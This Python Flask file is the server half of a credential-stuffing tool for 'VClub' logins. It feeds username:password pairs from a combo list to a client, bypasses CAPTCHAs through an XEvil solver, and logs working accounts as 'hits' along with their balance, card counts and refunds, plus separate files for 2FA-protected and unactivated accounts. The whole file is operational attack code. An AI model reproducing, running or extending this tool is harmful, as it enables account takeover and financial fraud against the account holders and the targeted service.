from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import requests
import base64
import logging
import time
import re

# Setup logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Setup paths
script_dir = os.path.dirname(os.path.abspath(__file__))
HIT_FOLDER = os.path.join(script_dir, "hit")
if not os.path.exists(HIT_FOLDER):
    os.makedirs(HIT_FOLDER)

app = Flask(__name__)
CORS(app)

# Load accounts file
filename = input("Enter your list file (with extension, e.g., accounts.txt): ")
accounts_path = os.path.join(script_dir, filename)
if not os.path.exists(accounts_path):
    if not filename.endswith('.txt'):
        accounts_path = os.path.join(script_dir, filename + '.txt')
        if not os.path.exists(accounts_path):
            logger.error('File not found: %s', accounts_path)
            print('File not found, exiting...')
            os.system('pause')
            exit()
ACCOUNTS_FILE = accounts_path

def load_accounts():
    if not os.path.exists(ACCOUNTS_FILE):
        logger.warning('Accounts file does not exist: %s', ACCOUNTS_FILE)
        return []
    
    accounts = []
    email_pattern = re.compile(r'[\w\.-]+@[\w\.-]+\.\w+')  # Regex for email detection
    number_pattern = re.compile(r'^\d+$')  # Regex for number-only passwords
    
    try:
        with open(ACCOUNTS_FILE, "r", encoding='utf-8') as f:
            for line_number, line in enumerate(f, 1):
                line = line.strip()
                if not line:
                    continue  # Skip empty lines
                
                # Split only on the first colon
                parts = line.split(":", 1)
                if len(parts) != 2:
                    logger.warning('Skipping invalid line %d: %s', line_number, line)
                    continue
                
                username, password = parts
                if not username or not password:
                    logger.warning('Skipping line %d with missing username or password: %s', line_number, line)
                    continue
                
                if email_pattern.match(username):
                    logger.warning('Skipping email format at line %d: %s', line_number, username)
                    continue
                
                if number_pattern.match(password.strip()):
                    logger.warning('Skipping number-only password at line %d: %s', line_number, line)
                    continue
                
                accounts.append({"username": username, "password": password})
                
                if line_number % 10000 == 0:
                    logger.info('Processed %d lines', line_number)
                    
    except Exception as e:
        logger.error('Error reading accounts file: %s', str(e))
        return []
    
    logger.info('Loaded %d valid accounts', len(accounts))
    return accounts

def save_accounts(accounts):
    with open(ACCOUNTS_FILE, "w") as f:
        for acc in accounts:
            f.write(f"{acc['username']}:{acc['password']}\n")

accounts = load_accounts()

@app.route("/get-creds", methods=["GET"])
def get_creds():
    global accounts
    if accounts:
        acc = accounts.pop(0)
        save_accounts(accounts)
        logger.info('Provided credentials: %s', acc['username'])
        return jsonify(acc)
    logger.warning('No credentials available')
    return jsonify({"error": "No credentials left"}), 404

@app.route("/solve-captcha", methods=["POST"])
def solve_captcha():
    data = request.json
    base64_image = data.get("image")
    if not base64_image:
        logger.error('Missing image in request')
        return jsonify({"error": "Missing image"}), 400

    logger.debug('Base64 image (first 50 chars): %s...', base64_image[:50])

    if base64_image.startswith('data:image'):
        base64_image = base64_image.split(',')[1]
        logger.debug('Stripped data URI, new base64 (first 50 chars): %s...', base64_image[:50])

    XEVIL_URL = "http://127.0.0.1:80/in.php"
    XEVIL_RESULT_URL = "http://127.0.0.1:80/res.php"
    USE_XEVIL = True

    try:
        if USE_XEVIL:
            logger.info('Sending captcha to XEvil server: %s', XEVIL_URL)
            payload = {
                'method': 'base64',
                'body': base64_image,
                'type': 1,
                'ext': 'jpg',
                'key': 'error',
                'soft_id': '1234'
            }
            start_time = time.time()
            response = requests.post(XEVIL_URL, data=payload, timeout=10)
            response.raise_for_status()
            logger.debug('XEvil response (took %.2f seconds): %s', time.time() - start_time, response.text)

            if response.text.startswith('OK|'):
                task_id = response.text.split('|')[1]
                logger.info('Received task ID: %s', task_id)

                for _ in range(10):
                    result_response = requests.get(XEVIL_RESULT_URL, params={'key': 'error', 'action': 'get', 'id': task_id}, timeout=5)
                    result_response.raise_for_status()
                    result_text = result_response.text
                    logger.debug('XEvil result response: %s', result_text)

                    if result_text.startswith('OK|'):
                        captcha_solution = result_text.split('|')[1]
                        logger.info('CAPTCHA solution: %s', captcha_solution)
                        response_data = {
                            'result': captcha_solution,
                            'captcha': captcha_solution,
                            'solution': captcha_solution
                        }
                        logger.debug('Sending response to client: %s', response_data)
                        return jsonify(response_data)
                    elif 'CAPCHA_NOT_READY' in result_text:
                        logger.info('CAPTCHA not ready, waiting...')
                        time.sleep(3)
                    else:
                        logger.error('Unexpected result response: %s', result_text)
                        return jsonify({'error': f'Failed to get CAPTCHA solution: {result_text}'}), 500

                logger.error('CAPTCHA solution not received after retries')
                return jsonify({'error': 'CAPTCHA solution not ready after retries'}), 500
            else:
                logger.error('Invalid XEvil response: %s', response.text)
                return jsonify({'error': f'Invalid XEvil response: {response.text}'}), 500
        else:
            logger.info('Sending captcha to original server: %s', ORIGINAL_URL)
            response = requests.post(ORIGINAL_URL, json={'image': base64_image}, timeout=10)
            response.raise_for_status()
            logger.debug('Original server response: %s', response.json())
            return jsonify(response.json())
    except requests.Timeout:
        logger.error('Request timed out')
        return jsonify({'error': 'Request to XEvil server timed out'}), 504
    except requests.RequestException as e:
        logger.error('Failed to solve captcha: %s', str(e))
        return jsonify({'error': f'Failed to solve captcha: {str(e)}'}), 500

@app.route("/report-2fa", methods=["POST"])
def report_2fa():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400
    hit_file = os.path.join(HIT_FOLDER, "2fa-hit.txt")
    with open(hit_file, "a") as f:
        f.write(f"{username}:{password}\n")
    logger.info('Logged 2FA hit: %s', username)
    return jsonify({"status": "success"})

@app.route("/report-unactivated", methods=["POST"])
def report_unactivated():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400
    free_file = os.path.join(HIT_FOLDER, "free.txt")
    with open(free_file, "a") as f:
        f.write(f"{username}:{password}\n")
    logger.info('Logged unactivated account: %s', username)
    return jsonify({"status": "success"})

@app.route("/report-hit", methods=["POST"])
def report_hit():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    balance = data.get("balance")
    totalCCS = data.get("totalCCS")
    amounts = data.get("amounts")
    refunds = data.get("refunds")
    if not all([username, password, balance, totalCCS, amounts, refunds]):
        return jsonify({"error": "Missing data"}), 400
    hit_file = os.path.join(HIT_FOLDER, "hit.txt")
    with open(hit_file, "a") as f:
        f.write(f"{username}:{password} Balance: {balance} $, Total CCS {totalCCS}, Amounts {amounts}$, Refunds {refunds}\n")
    logger.info('Logged hit: %s', username)
    return jsonify({"status": "success"})

if __name__ == "__main__":
    logger.info("Starting server for VClub login automation...")
    app.run(host="0.0.0.0", port=5050, debug=False)